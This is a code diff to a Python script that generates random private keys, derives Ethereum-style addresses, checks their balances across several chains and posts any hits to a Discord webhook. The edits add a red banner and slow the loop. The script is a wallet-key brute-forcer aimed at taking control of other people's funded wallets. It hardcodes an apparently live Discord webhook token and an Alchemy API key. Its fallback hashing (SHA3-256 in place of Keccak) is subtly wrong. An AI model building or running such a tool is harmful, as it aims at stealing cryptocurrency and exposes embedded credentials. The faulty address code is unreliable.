@@ -1,17 +1,32 @@
+import os
 import secrets
 import requests
 import time
 import hashlib
-from ecdsa import SigningKey, SECP256k1
 import json
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from ecdsa import SigningKey, SECP256k1
+from concurrent.futures import ThreadPoolExecutor
+
+# Show red banner at top
+def print_banner():
+    os.system("clear" if os.name == "posix" else "cls")
+    print("\033[91m" + r"""
+███╗░░░███╗░██████╗██╗░░██╗██╗░░░░░██╗░░░██╗
+████╗░████║██╔════╝╚██╗██╔╝██║░░░░░██║░░░██║
+██╔████╔██║╚█████╗░░╚███╔╝░██║░░░░░╚██╗░██╔╝
+██║╚██╔╝██║░╚═══██╗░██╔██╗░██║░░░░░░╚████╔╝░
+██║░╚═╝░██║██████╔╝██╔╝╚██╗███████╗░░╚██╔╝░░
+╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░
+""" + "\033[0m")
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1370714262237876224/od1EsdVEJ869kBHZB7vqGqXjOM55pcaK9NbPf_J97AUY5GFnHrVsRVcO-qB0oXY_012a"
 
+# Colors
 RED = "\033[91m"
 GREEN = "\033[92m"
 RESET = "\033[0m"
 
+# Alchemy API key for ETH (already in use below)
 RPC_ENDPOINTS = {
     "ETH": "https://eth-mainnet.g.alchemy.com/v2/kXg5eHzREfbkY0c7uxkdGOIRnjxHqby-",
     "POLYGON": "https://polygon-rpc.com",
@@ -34,8 +49,7 @@ def private_key_to_address(private_key_hex):
         keccak_hash = sha3.keccak_256(pub_key).digest()
     except ImportError:
         keccak_hash = hashlib.sha3_256(pub_key).digest()
-    address = "0x" + keccak_hash[-20:].hex()
-    return address
+    return "0x" + keccak_hash[-20:].hex()
 
 def check_balance(address, chain_rpc):
     chain, rpc_url = chain_rpc
@@ -56,20 +70,20 @@ def check_balance(address, chain_rpc):
         return chain, 0
 
 def send_to_discord(message):
-    data = {"content": message}
     try:
-        requests.post(WEBHOOK_URL, json=data)
+        requests.post(WEBHOOK_URL, json={"content": message})
     except Exception as e:
         print(f"Failed to send Discord message: {e}")
 
 try:
     while True:
-        for _ in range(10):  # 10 keys per batch
+        print_banner()
+
+        for _ in range(10):
             priv_key = generate_private_key()
             address = private_key_to_address(priv_key)
             found = False
 
-            # Run balance checks concurrently
             with ThreadPoolExecutor(max_workers=len(RPC_ENDPOINTS)) as executor:
                 futures = [executor.submit(check_balance, address, item) for item in RPC_ENDPOINTS.items()]
                 results = {f.result()[0]: f.result()[1] for f in futures}
@@ -95,7 +109,7 @@ try:
 
                 send_to_discord(msg)
 
-        time.sleep(0.1)
+        time.sleep(1)
 
 except KeyboardInterrupt:
     print("\nStopped by user.")
